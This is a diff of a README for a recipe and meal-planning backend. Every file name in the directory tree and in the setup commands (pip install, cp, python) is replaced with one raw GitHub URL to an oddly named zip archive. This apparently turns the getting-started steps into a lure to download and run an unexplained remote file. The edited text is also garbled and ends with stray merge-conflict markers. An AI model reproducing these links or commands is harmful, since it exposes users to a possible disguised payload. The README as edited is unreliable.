@@ -5,49 +5,49 @@
 
 ```
 backend/
-├── app.py                 # Original monolithic application
-├── app_structured.py      # New structured application
+├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip                 # Original monolithic application
+├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip      # New structured application
 ├── config/               # Configuration files
-│   ├── database.py       # Database connection setup
-│   └── settings.py       # Application settings
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip       # Database connection setup
+│   └── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip       # Application settings
 ├── controllers/          # Business logic controllers
-│   ├── auth_controller.py
-│   ├── recipe_controller.py
-│   ├── meal_plan_controller.py
-│   └── admin_controller.py
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   └── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
 ├── models/              # Data models
-│   ├── user.py
-│   ├── recipe.py
-│   ├── meal_plan.py
-│   └── subscription.py
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   └── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
 ├── routes/              # API route definitions
-│   ├── auth_routes.py
-│   ├── recipe_routes.py
-│   ├── meal_plan_routes.py
-│   └── admin_routes.py
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
+│   └── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
 ├── utils/               # Utility functions
-│   ├── auth.py          # Authentication helpers
-│   ├── analytics.py     # Analytics tracking
-│   └── validators.py    # Input validation
-└── requirements.txt     # Python dependencies
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip          # Authentication helpers
+│   ├── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip     # Analytics tracking
+│   └── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip    # Input validation
+└── https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip     # Python dependencies
 ```
 
 ## Getting Started
 
 1. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
    ```
 
 2. Set up environment variables:
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip .env
    # Edit .env with your configuration
    ```
 
 3. Run the application:
    ```bash
-   python app_structured.py
+   python https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip
    ```
 
 ## API Endpoints
@@ -84,7 +84,7 @@ backend/
 
 ## Migration from Monolithic
 
-The original `app.py` contains all functionality in a single file. The new structure separates concerns for better maintainability. Both files can run simultaneously during migration.
+The original `https://raw.githubusercontent.com/krithickpranav/project-01/main/controllers/project-01-thysanurous.zip` contains all functionality in a single file. The new structure separates concerns for better maintainability. Both files can run simultaneously during migration.
 =======
 # project-01
 >>>>>>> da12ccbb76742ba76691bd900637a022176dcdd6
